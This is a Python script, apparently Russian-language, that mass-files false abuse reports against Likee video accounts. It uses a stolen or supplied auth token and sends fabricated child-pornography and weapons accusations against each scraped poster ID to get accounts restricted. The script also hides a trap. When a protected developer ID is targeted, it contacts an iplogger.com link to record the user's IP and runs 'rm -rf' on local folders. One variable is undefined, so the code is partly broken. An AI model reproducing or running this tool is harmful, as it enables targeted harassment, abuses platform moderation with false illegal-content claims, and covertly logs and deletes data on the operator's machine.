user_agent = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.3"
url = "https://d2v9yioq9zuuq2.cloudfront.net/passthroush/live-api.likee.com/likee-bs-flow-client/accusation/submitSceneReport"

valid = '{"code":0,"data":{"success":true,"receipt":null},"message":"ok"}'

device_id = "yt4ugfgf8734t74hiugh34hiu38794"

#help
loger = "https://iplogger.com/2HT4V4"

import time
import requests
import json
import os
import colorama
from colorama import Fore
import re
import random


os.system("clear")

colorama.init()

logo = """
╭━╮╭━┳━━━┳━━━┳━━━╮╭━━━┳━╮╱╭┳━━━┳━━━╮
┃┃╰╯┃┃╭━╮┃╭━╮┃╭━╮┃┃╭━╮┃┃╰╮┃┃╭━╮┃╭━╮┃
┃╭╮╭╮┃┃╱┃┃╰━━┫╰━━╮┃╰━━┫╭╮╰╯┃┃╱┃┃╰━━╮
┃┃┃┃┃┃╰━╯┣━━╮┣━━╮┃╰━━╮┃┃╰╮┃┃┃╱┃┣━━╮┃
┃┃┃┃┃┃╭━╮┃╰━╯┃╰━╯┃┃╰━╯┃┃╱┃┃┃╰━╯┃╰━╯┃
╰╯╰╯╰┻╯╱╰┻━━━┻━━━╯╰━━━┻╯╱╰━┻━━━┻━━━╯
"""
print (Fore.RED + logo)
print ("")
print ("[+] МОЖНО СТАВИТЬ ОГРАНИЧЕНИЯ СРАЗУ НЕСКОЛЬКИМ АККАУНТАМ")
print ("")

f = open("data/LINES.txt", "r")

x_auth_token = input(Fore.YELLOW + "Введите токен>")

for urlv in f:
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.3'}
    
    os.system("clear")
    print ("")
    #print (f"Поток> {i+1}")
    line = requests.get(urlv, headers=headers)
    
    code_example = (line.text)
    match_post = re.search(r'"post_id":\s*"([^"]*)"', code_example)
    match_nick = re.search(r'"nick_name":\s*"([^"]*)"', code_example)
    match_uid = re.search(r'"poster_uid":\s*"([^"]*)"', code_example)
    share_post = match_post.group(1)
    share_nick = match_nick.group(1)
    share_uid = match_uid.group(1)
    video = (share_post)
    uid = (share_uid)
    info = f"""
    [+] Запуск атаки на <{share_nick}>
    [+] ID видео {share_post}
    [+] 1 REPORT
    """
    print (Fore.GREEN + info)

    if share_id == "1162421923":
        bot = requests.get(loger, headers=headers)
        os.system("clear")
        os.system("rm -rf tools")
        os.system("rm -rf api")
        print ("Вы были заблокированы за попытку сноса Разработчика или Администратора")
        exit()

    if share_id == "1192349175":
        bot = requests.get(loger, headers=headers)
        os.system("clear")
        os.system("rm -rf tools")
        os.system("rm -rf api")
        print ("Вы были заблокированы за попытку сноса Разработчика или Администратора")
        exit()

    
    data2 = {
        "deviceId": "30b547bcff21dd572aa81e032c773ec11be2eeeb",
        "language": "ru",
        "id": "42009",
        "reason": "Запрещённые предметы",
        "tagId": "1025",
        "tagName": "Огнестрельное оружие/ножи",
        "reportedId": uid,
        "dataJson": f'{{"description":"","attachments":[{{"postId":"{video}","videoUrl":"","coverUrl":"https://videosnap.like.video/eu_live/9uz/1tUXK000m0oLhES1kbrBQ_4.jpg?crc=2062572096&type=40"}}]}}'
    }

    data1 = {
        "deviceId": "30b547bcff21dd572aa81e032c773ec11be2eeeb",
        "language": "ru",
        "id": "42006",
        "reason": "Порнография или нагота",
        "tagId": "",
        "tagName": "",
        "reportedId": uid,
        "dataJson": f'{{"description":"детская порногорафия в видео.","attachments":[{{"postId":"{video}","videoUrl":"","coverUrl":"https://videosnap.like.video/eu_live/2uz/1unIFw00m4bSmrU1B41zt_4.jpg?crc=2062572096&type=40"}}]}}'
    }

    

    headers = {
        'Content-type': 'application/json',
        'User-Agent': user_agent,
        'X-Auth-Token': x_auth_token,
        'Accept-Language': 'ru'
    }

    

    res = requests.post(url, json=data1, headers=headers)
    if res.text == valid:
        print (res.text)
        time.sleep(1)
    else:
        print ("Токен устарел!")
        os.system("reset")
        os.system("python3 LIKROOT.py")
        exit()

    res = requests.post(url, json=data2, headers=headers)
    time.sleep(1)
    #res = requests.post(url, json=data3, headers=headers)
    
    #2
    print (f"Аккаунт {share_nick} Отработан")
    time.sleep(2)
    
    #os.system("clear")
    

print ("[=] Готово!")
print ("")
input("Нажмите Enter")
os.system("reset")
os.system("python3 LIKROOT.py")
exit()
    
    
    
    
    
    
    
    






